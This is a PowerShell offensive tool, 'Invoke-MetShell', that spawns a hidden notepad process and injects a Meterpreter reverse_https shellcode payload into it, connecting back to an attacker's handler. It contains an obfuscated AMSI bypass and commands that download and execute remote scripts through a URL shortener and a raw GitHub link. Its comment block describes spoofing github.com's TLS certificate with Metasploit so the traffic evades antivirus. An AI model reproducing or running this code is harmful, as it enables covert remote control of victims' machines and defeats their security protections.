function Invoke-MetShell
{
<#
.SYNOPSIS
	A wrapper for the well known Invoke-Shellcode. Spawn a win32 notepad hidden process, check the 
    	architecture of the curret PowerShell session and the spawn a Win32 Powershell if needed to inject 
    	the shellcode.  
.DESCRIPTION
	Author: @b4rtik
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.PARAMETER lhost
	Address of the handler.
.PARAMETER lport
	Port of the handler.
.EXAMPLE
	C:\PS> Invoke-MetShell -lhost 192.168.1.5 -lport 443
.NOTE

    First of all we need a cert to evade some AV with https.

    auxiliary/gather/impersonate_ssl

    Module options (auxiliary/gather/impersonate_ssl):

       Name              Current Setting  Required  Description
       ----              ---------------  --------  -----------
       ADD_CN                             no        Add CN to match spoofed site name (e.g. *.example.com)
       CA_CERT                            no        CA Public certificate
       EXPIRATION                         no        Date the new cert should expire (e.g. 06 May 2012, YESTERDAY or NOW)
       OUT_FORMAT        PEM              yes       Output format (Accepted: DER, PEM)
       PRIVKEY                            no        Sign the cert with your own CA private key
       PRIVKEY_PASSWORD                   no        Password for private key specified in PRIV_KEY (if applicable)
       RHOSTS            www.github.com   yes       The target address range or CIDR identifier
       RPORT             443              yes       The target port (TCP)
    exploit/multi/handler

    Payload options (windows/meterpreter/reverse_https):

       Name      Current Setting  Required  Description
       ----      ---------------  --------  -----------
       EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
       LHOST     192.168.1.5      yes       The local listener hostname
       LPORT     443              yes       The local listener port
       LURI                       no        The HTTP Path


    2 Advanced options must be set

    msf5 exploit(multi/handler) > set handlersslcert ./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem
    handlersslcert => ./20180929121944_default_192.30.253.112_www.github.com_p_690232.pem
    msf5 exploit(multi/handler) > set stagerverifysslcert true
    stagerverifysslcert => true
#>

    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [string]
        $lhost = '127.0.0.1',
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [ValidateRange( 1,65535 )]
        [Int]
        $lport = "443"
          )
    
    $procId = Run-Proc
    if ($env:Processor_Architecture -ne "x86")
    { 
        write-warning 'Run x86 PowerShell'
        #&"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').""GetF`ield""('ams'+'iIni'+'tFa'+'iled','Non'+'Public,Static').SetValue(`$null,`$true);iex((New-Object system.net.webclient).DownloadString('https://goo.gl/ks6EMR'));Invoke-Mycode -ProcessId $procId -Lhost $lhost -Lport $lport;exit;"
    	$scriptblock = {"[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').""GetF`ield""('ams'+'iIni'+'tFa'+'iled','Non'+'Public,Static').SetValue(`$null,`$true);iex((New-Object system.net.webclient).DownloadString('https://goo.gl/ks6EMR'));Invoke-Mycode -ProcessId $procId -Lhost $lhost -Lport $lport;"}
        start-job -scriptblock $scriptblock -RunAs32
    }
    else
    { 
        iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Invoke-ShellCode.ps1'))
        Invoke-Shellcode -ProcessId $procId -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Verbose -Force
    }
}

function Run-Proc
{ 
    $startinfo = New-Object System.Diagnostics.ProcessStartInfo
    $startinfo.FileName = "C:\Windows\SysWOW64\notepad.exe"
    $startinfo.WindowStyle = 'Hidden'
    $startinfo.CreateNoWindow = $True
    $Proc = [Diagnostics.Process]::Start($startinfo)

    return $Proc.id

}
